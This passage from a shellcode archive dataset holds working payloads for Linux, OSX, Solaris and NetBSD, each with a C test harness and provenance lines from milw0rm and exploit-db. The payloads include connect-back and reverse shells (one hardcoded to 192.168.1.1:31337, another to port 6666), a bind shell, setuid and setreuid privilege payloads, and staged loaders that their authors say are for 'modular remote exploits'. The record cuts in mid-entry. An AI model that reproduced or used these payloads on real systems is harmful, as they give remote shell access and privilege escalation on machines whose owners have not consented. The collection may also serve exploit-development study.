example", "// core@morpheus:~$ printf \"0x%02x%02x\\n0x%02x%02x\\n\" 192 168 1 1", "// 0xc0a8", "// 0x0101", "\"\\x63\\xbd\" /* PORT # */ \"\\x7a\\x69\"\t/*ori\tr29,r29,31337*/", "\"\\xb3\\xbe\\xff\\x18\"\t/*sth\tr29,-232(r30)*/", "\"\\x3f\\xa0\" /*IP(A.B) */ \"\\xc0\\xa8\"\t/*lis\tr29,-16216*/", "\"\\x63\\xbd\" /*IP(C.D) */ \"\\x01\\x01\"\t/*ori\tr29,r29,257*/", "\"\\x93\\xbe\\xff\\x1a\"\t/*stw\tr29,-230(r30)*/", "\"\\x93\\x1c\\xff\\x08\"\t/*stw\tr24,-248(r28)*/", "\"\\x3a\\xde\\xff\\x16\"\t/*addi\tr22,r30,-234*/", "\"\\x92\\xdc\\xff\\x0c\"\t/*stw\tr22,-244(r28)*/", "\"\\x3b\\xa0\\x01\\x1c\"\t/*li\tr29,284*/", "\"\\x38\\xbd\\xfe\\xf4\"\t/*addi\tr5,r29,-268*/", "\"\\x90\\xbc\\xff\\x10\"\t/*stw\tr5,-240(r28)*/", "\"\\x7f\\x20\\x16\\x70\"\t/*srawi\tr0,r25,2*/", "\"\\x7c\\x7a\\xda\\x14\"\t/*add\tr3,r26,r27*/", "\"\\x38\\x9c\\xff\\x08\"\t/*addi\tr4,r28,-248*/", "\"\\x44\\xde\\xad\\xf2\"\t/*.long0x44deadf2*/", "\"\\x7f\\x03\\xc3\\x78\"\t/*mr\tr3,r24*/", "\"\\x7c\\x84\\x22\\x78\"\t/*xor\tr4,r4,r4*/", "\"\\x3a\\xe0\\x01\\xf8\"\t/*li\tr23,504*/", "\"\\x7e\\xe0\\x1e\\x70\"\t/*srawi\tr0,r23,3*/", "\"\\x44\\xde\\xad\\xf2\"\t/*.long 0x44deadf2*/", "\"\\x7f\\x03\\xc3\\x78\"\t/*mr\tr3,r24*/", "\"\\x7f\\x64\\xdb\\x78\"\t/*mr\tr4,r27*/", "\"\\x7e\\xe0\\x1e\\x70\"\t/*srawi\tr0,r23,3*/", "\"\\x44\\xde\\xad\\xf2\"\t/*.long 0x44deadf2*/", "// comment out the next 4 lines to save 16 bytes and lose stderr", "//\"\\x7f\\x03\\xc3\\x78\"\t/*mr\tr3,r24*/", "//\"\\x7f\\x44\\xd3\\x78\"\t/*mr\tr4,r26*/", "//\"\\x7e\\xe0\\x1e\\x70\"\t/*srawi\tr0,r23,3*/", "//\"\\x44\\xde\\xad\\xf2\"\t/*.long 0x44deadf2*/", "\"\\x7c\\xa5\\x2a\\x79\"\t/*xor.\tr5,r5,r5*/", "\"\\x42\\x40\\xff\\x35\"\t/*bdzl+\t10000454<main>*/", "\"\\x7f\\x08\\x02\\xa6\"\t/*mflr\tr24*/", "\"\\x3b\\x18\\x01\\x34\"\t/*addi\tr24,r24,308*/", "\"\\x98\\xb8\\xfe\\xfb\"\t/*stb\tr5,-261(r24)*/", "\"\\x38\\x78\\xfe\\xf4\"\t/*addi\tr3,r24,-268*/", "\"\\x90\\x61\\xff\\xf8\"\t/*stw\tr3,-8(r1)*/", "\"\\x38\\x81\\xff\\xf8\"\t/*addi\tr4,r1,-8*/", "\"\\x90\\xa1\\xff\\xfc\"\t/*stw\tr5,-4(r1)*/", "\"\\x3b\\xc0\\x01\\x60\"\t/*li\tr30,352*/", "\"\\x7f\\xc0\\x2e\\x70\"\t/*srawi\tr0,r30,5*/", "\"\\x44\\xde\\xad\\xf2\"\t/*.long 0x44deadf2*/", "\"/bin/shZ\";\t/* Z will become NULL */", "", "int main(void)", "{", "  void (*shell)() = (void *)&hellcode;", "  printf(\"%d byte connect back execve /bin/sh for linux/ppc by core\\n\",", "          strlen(hellcode));", "  shell();", "  return 0;", "}", "", "// milw0rm.com [2005-11-09]"]},
{"Title": "Linux/x86 - dup2(0,0) + dup2(0,1) + dup2(0,2) Shellcode (15 bytes)", "Author": "Charles Stevenson", "Published": ": 2005-11-09", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-259.php", "View": null, "code": ["/* dup2_loop-core.c by Charles Stevenson <core@bokeoa.com> ", " *", " * I made this as a chunk you can paste in to make modular remote", " * exploits.  I usually combine this with an execve as the second", " * stage of a read() jmp *%esp", " */", "char hellcode[] = /* dup2(0,0); dup2(0,1); dup2(0,2); linux/x86 by core */", "\"\\x31\\xc9\"               \t// xor    %ecx,%ecx", "\"\\x56\"                   \t// push   %esi", "\"\\x5b\"                   \t// pop    %ebx", "// loop:", "\"\\x6a\\x3f\"               \t// push   $0x3f", "\"\\x58\"                   \t// pop    %eax", "\"\\xcd\\x80\"               \t// int    $0x80", "\"\\x41\"                   \t// inc    %ecx", "\"\\x80\\xf9\\x03\"           \t// cmp    $0x3,%cl", "\"\\x75\\xf5\"               \t// jne    80483e8 <loop>", ";", "", "int main(void)", "{", "  void (*shell)() = (void *)&hellcode;", "  printf(\"%d byte dup2(0,0); dup2(0,1); dup2(0,2); linux/x86 by core\\n\",", "         strlen(hellcode));", "  shell();", "  return 0;", "}", "", "// milw0rm.com [2005-11-09]"]},
{"Title": "Linux/x86 - if(read(fd,buf,512)<=2) _exit(1) else buf() Shellcode (29 bytes)", "Author": "Charles Stevenson", "Published": ": 2005-11-09", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-258.php", "View": null, "code": ["/* h3ll-core.c by Charles Stevenson <core@bokeoa.com> ", " *", " * I made this as a chunk you can paste in to make modular remote", " * exploits.  I use it as a first stage payload when I desire to", " * follow up with a real large payload of goodness.  This actually", " * is a bit larger than necessary because of the error checking but", " * in some cases prooves nice.  For a tiny version of the same theme", " * check out mcb's 14 byte (saving of 15 bytes for all you", " * mathematician's out there ;).  The only problem might be that his", " * reads from stdin and can only reads 385 bytes less than mine.  So", " * If you like to go big on the shellcode use mine... otherwise here's", " * mcb's (or comment out the delimited lines below to shrink mine):", " *", " * \"\\x6a\\x03\\x58\\x31\\xdb\\x6a\\x7f\\x5a\\x89\\xe1\\xcd\\x80\\xff\\xe4\"", " *", " * I assume the file descriptor is in %esi.  Since that's where it", " * was on the last exploit I wrote.  Change the instruction to", " * the appropriate register from your fndsckcode or put an int in", " * there for and fd that's always the same.", " */", "char hellcode[] = /* if(read(fd,buf,512)<=2) _exit(1) else buf(); linux/x86 by core */", "//  uncomment the following line to raise SIGTRAP in gdb", "// \"\\xcc\"                    // int3", "//  22 bytes:", "//  if (read(fd,buf,512) <= 0x2) _exit(1) else buf();", "\"\\x31\\xdb\"                  // xor    %ebx,%ebx", "\"\\xf7\\xe3\"                  // mul    %ebx", "\"\\x42\"                      // inc    %edx", "\"\\xc1\\xe2\\x09\"              // shl    $0x9,%edx", "\"\\x31\\xf3\"                  // xor    %esi,%ebx // (optional assumes fd in esi)", "\"\\x04\\x03\"                  // add    $0x3,%al", "\"\\x54\"                      // push   %esp", "\"\\x59\"                      // pop    %ecx", "\"\\xcd\\x80\"                  // int    $0x80", "\"\\x3c\\x02\"                  // cmp    $0x02,%al // (optional error check) ", "\"\\x7e\\x02\"                  // jle    exit      // (optional exit clean) ", "\"\\xff\\xe1\"                  // jmp    *%ecx", "//  7 bytes _exit(1) (optional _exit(1);)", "\"\\x31\\xc0\"                  // xor    %eax,%eax", "\"\\x40\"                      // inc    %eax", "\"\\x89\\xc3\"                  // mov    %eax,%ebx", "\"\\xcd\\x80\"                  // int    $0x80", ";", "", "int main(void)", "{", "  void (*shell)() = (void *)&hellcode;", "  printf(\"%d byte if(read(fd,buf,512)<=2) _exit(1) else buf(); linux/x86 by core\\n\\tNOTE: w/optional 11 bytes check and exit (recommend unless no room)\\n\",", "         strlen(hellcode));", "  shell();", "  return 0;", "}", "", "// milw0rm.com [2005-11-09]"]},
{"Title": "Linux/x86 - _exit(1) Shellcode (7 bytes)", "Author": "Charles Stevenson", "Published": ": 2005-11-09", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-55.php", "View": null, "code": ["/* exit-core.c by Charles Stevenson <core@bokeoa.com> ", " *", " * I made this as a chunk you can paste in to make modular remote", " * exploits.  I use it when I need a process to exit cleanly.", " */", "char hellcode[] = /*  _exit(1); linux/x86 by core */", "// 7 bytes _exit(1) ... 'cause we're nice >:) by core", "\"\\x31\\xc0\"              // xor  %eax,%eax", "\"\\x40\"                  // inc  %eax", "\"\\x89\\xc3\"              // mov  %eax,%ebx", "\"\\xcd\\x80\"              // int  $0x80", ";", "", "int main(void)", "{", "  void (*shell)() = (void *)&hellcode;", "  printf(\"%d byte _exit(1); linux/x86 by core\\n\",", "         strlen(hellcode));", "  shell();", "  return 0;", "}", "", "// milw0rm.com [2005-11-09]"]},
{"Title": "Linux/x86 - read(0,buf,2541) + chmod(buf,4755) Shellcode (23 bytes)", "Author": "Charles Stevenson", "Published": ": 2005-11-09", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-257.php", "View": null, "code": ["/* readnchmod-core.c by Charles Stevenson <core@bokeoa.com> ", " *", " * Example of strace output if you pass in \"/bin/sh\\x00\"", " * read(0, \"/bin/sh\\0\", 2541)              = 8", " * chmod(\"/bin/sh\", 04755)                 = 0", " *", " * Any file path can be given.  For example: /tmp/.sneakyguy", " * The only caveat is that the string must be NULL terminated.", " * This shouldn't be a problem.  For multi-stage payloads send", " * in this first and then you can send it data with null bytes.", " * I made this for rare cases with tight space contraints and", " * where read() jmp *%esp is not practical.", " *", " */", "char hellcode[] = /* read(0,buf,2541); chmod(buf,4755); linux/x86 by core */", "\"\\x31\\xdb\"//               xor    %ebx,%ebx", "\"\\xf7\\xe3\"//               mul    %ebx", "\"\\x53\"//                   push   %ebx", "\"\\xb6\\x09\"//               mov    $0x9,%dh", "\"\\xb2\\xed\"//               mov    $0xed,%dl", "\"\\x89\\xe1\"//               mov    %esp,%ecx", "\"\\xb0\\x03\"//               mov    $0x3,%al", "\"\\xcd\\x80\"//               int    $0x80", "\"\\x89\\xd1\"//               mov    %edx,%ecx", "\"\\x89\\xe3\"//               mov    %esp,%ebx", "\"\\xb0\\x0f\"//               mov    $0xf,%al", "\"\\xcd\\x80\"//               int    $0x80", ";", "", "int main(void)", "{", "  void (*shell)() = (void *)&hellcode;", "  printf(\"%d byte read(0,buf,2541); chmod(buf,4755); linux/x86 by core\\n\",", "         strlen(hellcode));", "  shell();", "  return 0;", "}", "", "// milw0rm.com [2005-11-09]"]},
{"Title": "Linux/x86 - write(0,\"Hello core!\\n\",12) + exit() Shellcode (36/43 bytes)", "Author": "Charles Stevenson", "Published": ": 2005-11-09", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13407.c", "View": "https://old.exploit-db.com/raw/13407/", "code": ["/* writehello-core.c by Charles Stevenson <core@bokeoa.com> ", " *", " * I made this as a chunk you can paste in to make modular remote", " * exploits.  I use it to see if my dup2_loop worked.  If you don't", " * get \"Hello core!\\n\" back it's a good indicator your shell won't", " * be functional the way you'd like.", " */", "char hellcode[] = /* write(0,\"Hello core!\\n\",12); linux/x86 by core */", "\"\\x31\\xdb\"              // xor  %ecx,%ecx", "\"\\xf7\\xe3\"              // mul  %ecx", "\"\\x53\"                  // push %ecx", "\"\\x68\\x72\\x65\\x21\\x0a\"  // push $0xa216572", "\"\\x68\\x6f\\x20\\x63\\x6f\"  // push $0x6f63206f", "\"\\x68\\x48\\x65\\x6c\\x6c\"  // push $0x6c6c6548", "\"\\xb2\\x0c\"              // mov  $0xc,%dl", "\"\\x43\"                  // inc  %ebx", "\"\\x89\\xe1\"              // mov  %esp,%ecx", "\"\\xb0\\x04\"              // mov  $0x4,%al", "\"\\xcd\\x80\"              // int  $0x80", "// not needed.. makes it exit cleanly", "// 7 bytes _exit(1) ... 'cause we're nice >:) by core", "\"\\x31\\xc0\"              // xor  %eax,%eax", "\"\\x40\"                  // inc  %eax", "\"\\x89\\xc3\"              // mov  %eax,%ebx", "\"\\xcd\\x80\"              // int  $0x80", ";", "", "int main(void)", "{", "  void (*shell)() = (void *)&hellcode;", "  printf(\"%d byte (w/optional 7 byte exit) write(0,\\\"Hello core!\\\\n\\\",12); linux/x86 by core\\n\",", "         strlen(hellcode));", "  shell();", "  return 0;", "}", "", "// milw0rm.com [2005-11-09]"]},
{"Title": "OSX/PPC / OSX/x86 - execve(\"/bin/sh\",{\"/bin/sh\",NULL},NULL) Shellcode (121 bytes)", "Author": "nemo", "Published": ": 2005-11-13", "Platform": "Multiple", "Download": "https://old.exploit-db.com/download/13466.c", "View": "https://old.exploit-db.com/raw/13466/", "code": ["/*", " * -[ dual.c ]-", " * by nemo@felinemenace.org", " *", " * execve(\"/bin/sh\",{\"/bin/sh\",NULL},NULL) shellcode", " * for osx (both the ppc and x86 version.)", " *", " * Sample output:", " *", " * -[nemo@squee:~/shellcode]$ file dual-ppc", " * dual-ppc: Mach-O executable ppc", " * -[nemo@squee:~/shellcode]$ ./dual-ppc", " * sh-2.05b$ exit", " *", " * -[nemo@squee:~/shellcode]$ file dual-x86", " * dual-x86: Mach-O executable i386", " * -[nemo@squee:~/shellcode]$ ./dual-x86", " * sh-2.05b$ exit", " */", "", "char dual[] =", "//", "// These four bytes work out to the following instruction", "// in ppc arch: \"rlwnm   r16,r28,r29,13,4\", which will", "// basically do nothing on osx/ppc.", "//", "// However on x86 architecture the four bytes are 3", "// instructions:", "//", "// \"push/nop/jmp\"", "//", "// In this way, execution will be taken to the x86 shellcode", "// on an x86 machine, and the ppc shellcode when running", "// on a ppc architecture machine.", "//", "\"\\x5f\\x90\\xeb\\x48\"", "", "// ppc execve() code by b-r00t", "\"\\x7c\\xa5\\x2a\\x79\\x40\\x82\\xff\\xfd\"", "\"\\x7d\\x68\\x02\\xa6\\x3b\\xeb\\x01\\x70\"", "\"\\x39\\x40\\x01\\x70\\x39\\x1f\\xfe\\xcf\"", "\"\\x7c\\xa8\\x29\\xae\\x38\\x7f\\xfe\\xc8\"", "\"\\x90\\x61\\xff\\xf8\\x90\\xa1\\xff\\xfc\"", "\"\\x38\\x81\\xff\\xf8\\x38\\x0a\\xfe\\xcb\"", "\"\\x44\\xff\\xff\\x02\\x7c\\xa3\\x2b\\x78\"", "\"\\x38\\x0a\\xfe\\x91\\x44\\xff\\xff\\x02\"", "\"\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x58\"", "", "// osx86 execve() code by nemo", "\"\\x31\\xdb\\x6a\\x3b\\x58\\x53\\xeb\\x18\\x5f\"", "\"\\x57\\x53\\x54\\x54\\x57\\x6a\\xff\\x88\\x5f\"", "\"\\x07\\x89\\x5f\\xf5\\x88\\x5f\\xfa\\x9a\\xff\"", "\"\\xff\\xff\\xff\\x2b\\xff\\xe8\\xe3\\xff\\xff\"", "\"\\xff/bin/shX\";", "", "int main(int ac, char **av)", "{", "       void (*fp)() = dual;", "       fp();", "}", "", "// milw0rm.com [2005-11-13]"]},
{"Title": "Linux/PPC / Linux/x86 - execve(\"/bin/sh\",{\"/bin/sh\",NULL},NULL) Shellcode (99 bytes)", "Author": "Charles Stevenson", "Published": ": 2005-11-15", "Platform": "Multiple", "Download": "https://old.exploit-db.com/download/13465.c", "View": "https://old.exploit-db.com/raw/13465/", "code": ["/*", " * -[ dual-linux.c ]-", " * by core@bokeoa.com (ripped from nemo@felinemenace.org)", " *                     ^-- much <3 brotha ;)", " *", " * execve(\"/bin/sh\",{\"/bin/sh\",NULL},NULL) shellcode for linux (both the ppc", " * and x86 version.) I thought about adding mipsel but I don't feel up to it", " * at the moment.  In fact I feel like crap...", " *", " * Shoutz to nemo, andrewg, KF, ghandi, phased, MRX, Blue Boar, Solar Eclipse,", " * HDM, FX, Max Vision, MaXx, c0ntex, izik, xort, banned-it, hoglund, SkyLined,", " * Gera, Stealth (7350), Emmanuel, Hackademy, Raptor (0xdeadbeef), sh0k, jduck,", " * xfocus, LSD, ADM, b10z, 0dd, ES, runixd, packy, norse, mXn, thn, dragnet,", " * hdm, fozzy, str0ke, B|ueberry, <S>, rjohnson, Kaliman, capsyl, salvia,", " * amnesia, arcanum, eazyass, loophole, my family and so any others...", " * ", " * irc.pulltheplug.org #social", " *", " * peace ~ metta ~", " *", " * References:", " * http://milw0rm.com/id.php?id=1318", " * http://www.phrack.org/phrack/57/p57-0x0e", " */", "", "char dual_linux[] =", "//", "// These four bytes work out to the following instruction", "// in ppc arch: \"rlwnm   r16,r28,r29,13,4\", which will", "// basically do nothing on osx/ppc.", "//", "// However on x86 architecture the four bytes are 3", "// instructions:", "//", "// \"push/nop/jmp\"", "//", "// In this way, execution will be taken to the x86 shellcode", "// on an x86 machine, and the ppc shellcode when running", "// on a ppc architecture machine.", "//", "\"\\x5f\\x90\\xeb\\x48\"", "", "\"\\x69\\x69\\x69\\x69\"\t/*nop*/", "\"\\x69\\x69\\x69\\x69\"\t/*nop*/", "\"\\x69\\x69\\x69\\x69\"\t/*nop*/", "// linux/ppc execve /bin/sh by Charles Stevenson (core) <core@bokeoa.com>", "\"\\x7c\\x3f\\x0b\\x78\"\t/*mr\tr31,r1 # optional instruction */", "\"\\x7c\\xa5\\x2a\\x79\"\t/*xor.\tr5,r5,r5*/", "\"\\x42\\x40\\xff\\xf9\"\t/*bdzl+\t10000454<main>*/", "\"\\x7f\\x08\\x02\\xa6\"\t/*mflr\tr24*/", "\"\\x3b\\x18\\x01\\x34\"\t/*addi\tr24,r24,308*/", "\"\\x98\\xb8\\xfe\\xfb\"\t/*stb\tr5,-261(r24)*/", "\"\\x38\\x78\\xfe\\xf4\"\t/*addi\tr3,r24,-268*/", "\"\\x90\\x61\\xff\\xf8\"\t/*stw\tr3,-8(r1)*/", "\"\\x38\\x81\\xff\\xf8\"\t/*addi\tr4,r1,-8*/", "\"\\x90\\xa1\\xff\\xfc\"\t/*stw\tr5,-4(r1)*/", "\"\\x3b\\xc0\\x01\\x60\"\t/*li\tr30,352*/", "\"\\x7f\\xc0\\x2e\\x70\"\t/*srawi\tr0,r30,5*/", "\"\\x44\\xde\\xad\\xf2\"\t/*.long\t0x44deadf2*/", "\"/bin/shZ\" // the last byte becomes NULL", "", "// lnx_binsh4.c - v1 - 23 Byte /bin/sh sysenter Opcode Array Payload", "// Copyright(c) 2005 c0ntex <c0ntex@open-security.org>", "// Copyright(c) 2005 BaCkSpAcE <sinisa86@gmail.com>", "\"\\x6a\\x0b\\x58\\x99\\x52\\x68\\x2f\\x2f\"", "\"\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x54\"", "\"\\x5b\\x52\\x53\\x54\\x59\\x0f\\x34\";", "", "int main(int ac, char **av)", "{", "       void (*fp)() = dual_linux;", "       fp();", "}", "", "// in loving memory of hack.co.za", "", "// milw0rm.com [2005-11-15]"]},
{"Title": "Solaris/SPARC - setreuid() + execve() Shellcode (56 bytes)", "Author": "lhall", "Published": ": 2005-11-20", "Platform": "Solaris_SPARC", "Download": "http://shell-storm.org/shellcode/files/shellcode-118.php", "View": null, "code": ["/*", " * lhall@telegenetic.net", " * setreuid shellcode", " * full description of how it was done and defines at", " * http://www.telegenetic.net/sparc-shellcode.htm", " */", "", "char shellcode[] =", "\"\\x90\\x1A\\x40\\x09\"  /* xor %o1, %o1, %o0          */", "\"\\x92\\x1A\\x40\\x09\"  /* xor %o1, %o1, %o1          */", "\"\\x82\\x10\\x20\\xCA\"  /* mov SYS_SETREUID(202), %g1 */", "\"\\x91\\xD0\\x20\\x08\"  /* ta KERNEL(0x08)            */", "\"\\x21\\x0B\\xD8\\x9A\"  /* sethi %hi(0x2f626900), %l0 */", "\"\\xA0\\x14\\x21\\x6E\"  /* or %l0, %lo(0x16e), %l0    */", "\"\\x23\\x0B\\xDC\\xDA\"  /* sethi %hi(0x2f736800), %l1 */", "\"\\xE0\\x3B\\xBF\\xF0\"  /* std %l0, [%sp - 0x10]      */", "\"\\x90\\x23\\xA0\\x10\"  /* sub %sp, 0x10, %o0         */", "\"\\xD0\\x23\\xBF\\xF8\"  /* st  %o0, [%sp - 0x8]       */", "\"\\x92\\x23\\xA0\\x08\"  /* sub %sp, 0x8, %o1          */", "\"\\x94\\x1A\\x80\\x0A\"  /* xor %o2, %o2, %o2          */", "\"\\x82\\x10\\x20\\x3B\"  /* mov SYS_EXECVE(59), %g1    */", "\"\\x91\\xD0\\x20\\x08\"; /* ta KERNEL(0x08)            */", "", "int", "main (int argc, char **argv)", "{", "       int (*ret)();", "       ret = (int(*)())shellcode;", "       (int)(*ret)();", "       exit(0);", "}", "", "// milw0rm.com [2005-11-20]"]},
{"Title": "Solaris/SPARC - Bind (6666/TCP) Shell Shellcode (240 bytes)", "Author": "lhall", "Published": ": 2005-11-20", "Platform": "Solaris_SPARC", "Download": "http://shell-storm.org/shellcode/files/shellcode-117.php", "View": null, "code": ["/*", " * lhall@telegenetic.net", " * portbind shellcode", " * full description of how it was done and defines at", " * http://www.telegenetic.net/sparc-shellcode.htm", " */", "", "", "char shellcode[]=", "\"\\x9A\\x1A\\x40\\x09\" /* xor %o1, %o1, %o5          */", "\"\\x90\\x10\\x20\\x02\" /* mov PF_INET, %o0           */", "\"\\x92\\x10\\x20\\x02\" /* mov SOCK_STREAM, %o1       */", "\"\\x94\\x10\\x20\\x06\" /* mov IPPROTO_TCP, %o2       */", "\"\\x96\\x1A\\x40\\x09\" /* xor %o1, %o1, %o3          */", "\"\\x98\\x22\\x20\\x01\" /* sub %o0, 1, %o4            */", "\"\\x82\\x10\\x20\\xE6\" /* mov SYS_SOCKET, %g1        */", "\"\\x91\\xD0\\x20\\x08\" /* ta KERNEL                  */", "\"\\xA0\\x1B\\x40\\x08\" /* xor %o5, %o0, %l0          */", "\"\\xC0\\x23\\xBF\\xF4\" /* st  %g0, [%sp - 0xc]       */", "\"\\xA2\\x10\\x2D\\x05\" /* mov 3333, %l1              */", "\"\\xE2\\x33\\xBF\\xF2\" /* sth %l1, [%sp - 0xe]       */", "\"\\xA2\\x10\\x20\\x02\" /* mov AF_INET, %l1           */", "\"\\xE2\\x33\\xBF\\xF0\" /* sth %l1, [%sp - 0x10]      */", "\"\\x92\\x23\\xA0\\x10\" /* sub %sp, 0x10, %o1         */", "\"\\x94\\x10\\x20\\x10\" /* mov SOCKADDR_IN_SIZE, %o2  */", "\"\\x82\\x10\\x20\\xE8\" /* mov SYS_BIND, %g1          */", "\"\\x91\\xD0\\x20\\x08\" /* ta KERNEL                  */", "\"\\x90\\x1B\\x40\\x10\" /* xor %o5, %l0, %o0          */", "\"\\x92\\x1B\\x40\\x0C\" /* xor %o5, %o4, %o1          */", "\"\\x94\\x1B\\x40\\x0C\" /* xor %o5, %o4, %o2          */", "\"\\x82\\x10\\x20\\xE9\" /* mov SYS_LISTEN, %g1        */", "\"\\x91\\xD0\\x20\\x08\" /* ta KERNEL                  */", "\"\\xA2\\x10\\x20\\x10\" /* mov SOCKADDR_IN_SIZE, %l1  */", "\"\\xE2\\x23\\xBF\\xDC\" /* st %l1, [%sp - 0x24]       */", "\"\\x90\\x1B\\x40\\x10\" /* xor %o5, %l0, %o0          */", "\"\\x92\\x23\\xA0\\x20\" /* sub %sp, 0x20, %o1         */", "\"\\x94\\x23\\xA0\\x24\" /* sub %sp, 0x24, %o2         */", "\"\\x96\\x1B\\x40\\x0C\" /* xor %o5, %o4, %o3          */", "\"\\x82\\x10\\x20\\xEA\" /* mov SYS_ACCEPT, %g1        */", "\"\\x91\\xD0\\x20\\x08\" /* ta KERNEL                  */", "\"\\xA4\\x1B\\x40\\x08\" /* xor %o5, %o0, %l2          */", "\"\\x90\\x1B\\x40\\x0C\" /* xor %o5, %o4, %o0          */", "\"\\x82\\x10\\x20\\x06\" /* mov SYS_CLOSE, %g1         */", "\"\\x91\\xD0\\x20\\x08\" /* ta KERNEL                  */", "\"\\x91\\xD0\\x20\\x08\" /* ta KERNEL                  */", "\"\\x94\\x1B\\x40\\x0C\" /* xor %o5, %o4, %o2          */", "\"\\x94\\x02\\x80\\x0A\" /* add %o2, %o2, %o2          */", "\"\\x90\\x1B\\x40\\x0A\" /* xor %o5, %o2, %o0          */", "\"\\x91\\xD0\\x20\\x08\" /* ta KERNEL                  */", "\"\\x92\\x1A\\x40\\x09\" /* xor %o1, %o1, %o1          */", "\"\\x90\\x1B\\x40\\x12\" /* xor %o5, %l2, %o0          */", "\"\\x82\\x10\\x20\\x3E\" /* mov SYS_FCNTL, %g1         */", "\"\\x91\\xD0\\x20\\x08\" /* ta KERNEL                  */", "\"\\x90\\x1B\\x40\\x12\" /* xor %o5, %l2, %o0          */", "\"\\x94\\x1A\\x40\\x09\" /* xor %o1, %o1, %o2          */", "\"\\x91\\xD0\\x20\\x08\" /* ta KERNEL                  */", "\"\\x94\\x1B\\x40\\x0C\" /* xor %o5, %o4, %o2          */", "\"\\x90\\x1B\\x40\\x12\" /* xor %o5, %l2, %o0          */", "\"\\x91\\xD0\\x20\\x08\" /* ta KERNEL                  */", "\"\\x21\\x0B\\xD8\\x9A\" /* sethi %hi(0x2f626900), %l0 */", "\"\\xA0\\x14\\x21\\x6E\" /* or %l0, %lo(0x16e), %l0    */", "\"\\x23\\x0B\\xDC\\xDA\" /* sethi %hi(0x2f736800), %l1 */", "\"\\xE0\\x3B\\xBF\\xF0\" /* std %l0, [%sp - 0x10]      */", "\"\\x90\\x23\\xA0\\x10\" /* sub %sp, 0x10, %o0         */", "\"\\xD0\\x23\\xBF\\xF8\" /* st  %o0, [%sp - 0x8]       */", "\"\\x92\\x23\\xA0\\x08\" /* sub %sp, 0x8, %o1          */", "\"\\x94\\x1A\\x80\\x0A\" /* xor %o2, %o2, %o2          */", "\"\\x82\\x10\\x20\\x3B\" /* mov SYS_EXECVE, %g1        */", "\"\\x91\\xD0\\x20\\x08\"; /* ta KERNEL                 */", "", "int", "main (int argc, char **argv)", "{", "       int (*ret)();", "       ret = (int(*)())shellcode;", "       (int)(*ret)();", "       exit(0);", "}", "", "// milw0rm.com [2005-11-20]"]},
{"Title": "NetBSD/x86 - Reverse (6666/TCP) Shell Shellcode (83 bytes)", "Author": "p. minervini", "Published": ": 2005-11-30", "Platform": "NetBSD_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-110.php", "View": null, "code": ["/*", " *  minervini at neuralnoise dot com (c) 2005", " *  NetBSD/i386 2.0, callback shellcode (port 6666);", " */", "", "#include <sys/types.h>", "#include <stdio.h>", "#include <string.h>", "", "char scode[] =", "  \"\\x31\\xc0\"             // xor    %eax,%eax", "  \"\\x31\\xc9\"\t\t // xor    %ecx,%ecx", "  \"\\x50\"                 // push   %eax", "  \"\\x40\"                 // inc    %eax", "  \"\\x50\"                 // push   %eax", "  \"\\x40\"                 // inc    %eax", "  \"\\x50\"                 // push   %eax", "  \"\\x50\"                 // push   %eax", "  \"\\xb0\\x61\"             // mov    $0x61,%al", "  \"\\xcd\\x80\"             // int    $0x80", "  \"\\x89\\xc3\"             // mov    %eax,%ebx", "  \"\\x89\\xe2\"             // mov    %esp,%edx", "  \"\\x49\"                 // dec    %ecx", "  \"\\x51\"                 // push   %ecx", "  \"\\x51\"                 // push   %ecx", "  \"\\x41\"                 // inc    %ecx", "  \"\\x68\\xf5\\xff\\xff\\xfd\" // push   $0xfdfffff5", "  \"\\x68\\xff\\xfd\\xe5\\xf5\" // push   $0xf5e5fdff", "  \"\\xb1\\x10\"             // mov    $0x10,%cl", "  \"\\x51\"                 // push   %ecx", "  \"\\xf6\\x12\"             // notb   (%edx)", "  \"\\x4a\"                 // dec    %edx", "  \"\\xe2\\xfb\"             // loop   .-3", "  \"\\xf6\\x12\"             // notb   (%edx)", "  \"\\x52\"                 // push   %edx", "  \"\\x50\"                 // push   %eax", "  \"\\x50\"                 // push   %eax", "  \"\\xb0\\x62\"             // mov    $0x62,%al", "  \"\\xcd\\x80\"             // int    $0x80", "  \"\\xb1\\x03\"             // mov    $0x3,%cl", "  \"\\x49\"                 // dec    %ecx", "  \"\\x51\"                 // push   %ecx", "  \"\\x41\"                 // inc    %ecx", "  \"\\x53\"                 // push   %ebx", "  \"\\x50\"                 // push   %eax", "  \"\\xb0\\x5a\"             // mov    $0x5a,%al", "  \"\\xcd\\x80\"             // int    $0x80", "  \"\\xe2\\xf5\"             // loop   .-9", "  \"\\x51\"                 // push   %ecx", "  \"\\x68\\x2f\\x2f\\x73\\x68\" // push   $0x68732f2f", "  \"\\x68\\x2f\\x62\\x69\\x6e\" // push   $0x6e69622f", "  \"\\x89\\xe3\"             // mov    %esp,%ebx", "  \"\\x51\"                 // push   %ecx", "  \"\\x54\"                 // push   %esp", "  \"\\x53\"                 // push   %ebx", "  \"\\x50\"                 // push   %eax", "  \"\\xb0\\x3b\"             // mov    $0x3b,%al", "  \"\\xcd\\x80\";            // int    $0x80", "", "int main() {", "   scode[23] = ~10;", "   scode[24] = ~0;", "   scode[25] = ~0;", "   scode[26] = ~2;", "   void (*code) () = (void *) scode;", "   printf(\"length: %d\\n\", strlen(scode));", "   code();", "   return (0);", "}", "", "// milw0rm.com [2005-11-30]"]},
